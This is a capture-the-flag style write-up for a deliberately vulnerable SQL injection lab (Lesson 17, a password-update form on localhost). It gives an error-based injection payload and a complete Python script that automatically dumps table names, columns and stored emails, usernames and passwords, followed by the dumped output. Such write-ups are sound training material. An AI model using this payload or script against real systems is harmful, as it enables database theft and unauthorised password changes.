# Lesson-17

POST parameter UPDATE Query  injection

When we try just `admin` and `12345` we get **SUCCESSFULLY UPDATED YOUR PASSWORD**

When we try to inject in the username field It shows **BUG OFF YOU SILLY DUMB HACKER**

But when we try to inject in the password field with a valid username, we were able to do that

Putting username as `admin` and password as `'` gave us an error

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1
```

So the query must be like :

```ABAP
UPDATE users SET password="" where username="admin"
```

So we have to use `'` to break the query and it shows errors so we have to get the password through errors

We give username : `admin` and password `' or 1=1 #` It gives : **SUCCESSFULLY UPDATED YOUR PASSWORD**

payload :

```ABAP
' or (select 1 from(select count(*),concat(0x3a,(select email_id from emails limit 0,1),0x3a,floor(rand()*2))a from information_schema.tables group by a)b); #
```

So I created a script to do the work

```python
import requests


get_table = "(select table_name from information_schema.tables where table_schema= database() limit {0},1)"
get_column = "(select column_name from information_schema.columns where table_name = '{0}' limit {1},1)"
get_secret = "(select {0} from {1} limit {2},1)"
url = "http://localhost:1234/Less-17/"
session = requests.Session()

payload="' or (select 1 from(select count(*),concat(0x3a,{},0x3a,floor(rand()*2))a from information_schema.tables group by a)b); #"
table=""
for i in range(4):
    find=get_table.format(i)
    response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
    temp=response.text[1392:1460]
    table=temp[temp.index(':')+1:temp.rindex(':')]
    column=""
    print("From Table",table,": ")
    for j in range(4):
        find=get_column.format(table,j)
        response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
        temp=response.text[1392:1460]
        if(':' in temp):
            column=temp[temp.index(':')+1:temp.rindex(':')]
            content=""
            print("Column",column," - ",end='')
            for k in range(10):
                find=get_secret.format(column,table,k)
                response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
                while('Subquery returns more than 1 row' in response.text):
                    response = requests.post(url,data={'uname':'admin','passwd':payload.format(find)})
                temp=response.text[1392:1460]
                if(':' in temp):
                    content=temp[temp.index(':')+1:temp.rindex(':')]
                    print(content,end=",")
            print()
```

It gave me:

```ABAP
From Table emails : 
Column id  - 1,2,3,4,5,6,7,8,
Column email_id  - Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com,
From Table referers : 
Column id  - 
Column referer  - 
Column ip_address  - 
From Table uagents : 
Column id  - 
Column uagent  - 
Column ip_address  - 
Column username  - 
From Table users : 
Column id  - 1,2,3,4,5,6,7,8,9,10,
Column username  - Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,
Column password  - 1,1,1,1,1,1,1,1,1,1,
```
